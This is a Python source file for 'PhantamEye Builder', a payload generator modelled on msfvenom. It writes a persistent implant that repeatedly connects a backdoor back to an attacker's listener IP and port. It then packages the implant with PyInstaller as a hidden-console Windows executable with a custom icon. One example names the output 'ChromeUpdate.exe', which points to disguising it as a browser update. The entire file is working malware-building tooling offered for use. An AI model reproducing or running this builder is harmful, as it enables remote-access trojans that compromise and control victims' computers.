#!/usr/bin/env python3
"""
PhantamEye Builder — like msfvenom.
Usage:
    python builder.py --lhost 192.168.1.100 --lport 4444 --output payload.exe
"""

import os
import sys
import shutil
import argparse
import subprocess
import tempfile


BUILDER_DIR = os.path.dirname(os.path.abspath(__file__))
IMPLANT_MAIN = os.path.join(BUILDER_DIR, "implant", "__main__.py")
BACKDOOR_FILE = os.path.join(BUILDER_DIR, "implant", "backdoor.py")

TEMPLATE = '''"""Auto-generated implant — DO NOT EDIT MANUALLY."""
import sys
import os
import time
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from PhantamEye.implant.backdoor import Implant

if __name__ == "__main__":
    while 1:
        try:
        
            bd = Implant("{LHOST}", {LPORT})
            bd.main()
        except Exception as e:
            time.sleep(5)
            pass
'''


def build_implant(lhost, lport,output,icon, no_console=True, onefile=True):
    """
    1. Create a temporary directory
    2. Write the implant __main__.py with the user's LHOST/LPORT
    3. Copy the full rattler package into the temp dir
    4. Compile with PyInstaller
    5. Move the exe to the output path
    """
    temp_dir = tempfile.mkdtemp(prefix="rattler_build_")
    rattler_copy = os.path.join(temp_dir, "PhantamEye")

    print(f"\n[*] Creating implant for {lhost}:{lport}")
   

    # Copy the entire rattler package
    shutil.copytree(BUILDER_DIR, rattler_copy)

    # Overwrite __main__.py with the user's config
    main_path = os.path.join(rattler_copy, "implant", "__main__.py")
    with open(main_path, "w") as f:
        f.write(TEMPLATE.format(LHOST=lhost, LPORT=lport))
    print(f"[+] Written LHOST={lhost}, LPORT={lport} to implant")

    # Write a temporary entry point script outside the package
    entry_point = os.path.join(temp_dir, "entry.py")
    with open(entry_point, "w") as f:
        f.write(f"""import sys
import time
sys.path.insert(0, {repr(temp_dir)})
from PhantamEye.implant.backdoor import Implant
while 1:
    try:
        bd = Implant("{lhost}", {lport})
        bd.main()
        
    except Exception as e:
        time.sleep(5)
        pass
""")


    # Build with PyInstaller
    cmd = ["pyinstaller"]

    icon = os.path.abspath(icon) if os.path.exists(icon) else False
    
    if onefile:
        cmd.append("--onefile")
    if no_console:
        cmd.append("--noconsole")
    if icon:
        cmd.append(f'--icon={icon}')

    cmd.extend([
        "--distpath", temp_dir,
        "--workpath", os.path.join(temp_dir, "build"),
        "--specpath", temp_dir,
        "--name", os.path.splitext(os.path.basename(output))[0],
        entry_point
    ])

    print(f"\n[*] Generating Exe Payload file and Writting to {output} ")
    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode != 0:
        print(f"\n[!] Build failed:\n{result.stderr}")
        print(f"[!] stdout:\n{result.stdout}")
        shutil.rmtree(temp_dir)
        sys.exit(1)

    # Locate the built exe
    exe_name = os.path.splitext(os.path.basename(output))[0] + ".exe"
    built_exe = os.path.join(temp_dir, exe_name)

    if os.path.exists(built_exe):
        os.makedirs(os.path.dirname(output) if os.path.dirname(output) else ".", exist_ok=True)
        shutil.move(built_exe, output)
        print(f"\n[+] Success! Payload written to: {output}")
        print(f"[+] File size: {os.path.getsize(output) / 1024:.1f} KB")
    else:
        print(f"\n[!] Built exe not found at {built_exe}")
        print(f"[!] Looked for: {exe_name}")
        print(f"[-] Try Again")
        shutil.rmtree(temp_dir)
        sys.exit(1)

    # Cleanup temp
    shutil.rmtree(temp_dir)


def main():
    parser = argparse.ArgumentParser(
        description="PhantamEye Payload Builder — build Payload with to connect your host",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python builder.py --lhost 192.168.1.100 --lport 4444 -o payload.exe
  python builder.py --lhost 10.0.0.5 --lport 5555 -o ChromeUpdate.exe --console
        """
    )
    parser.add_argument("--lhost", required=True, help="Listener IP address")
    parser.add_argument("--lport", type=int, required=True, help="Listener port")
    parser.add_argument("-o", "--output", default="payload.exe", help="Output exe path")
    parser.add_argument("--icon",default="images\\icon.ico",help="Icon for the exe file")
    parser.add_argument("--console", action="store_true", help="Keep console window (default: hidden)")
    parser.add_argument("--multi-file", action="store_true", help="Build as folder instead of single exe")

    args = parser.parse_args()

    # Check PyInstaller is available
    if not shutil.which("pyinstaller"):
        print("[!] PyInstaller not found. Install it with: pip install pyinstaller")
        sys.exit(1)

    build_implant(
        lhost=args.lhost,
        lport=args.lport,
        output=args.output,
        icon=args.icon,
        no_console=not args.console,
        onefile=not args.multi_file
    )


if __name__ == "__main__":
    main()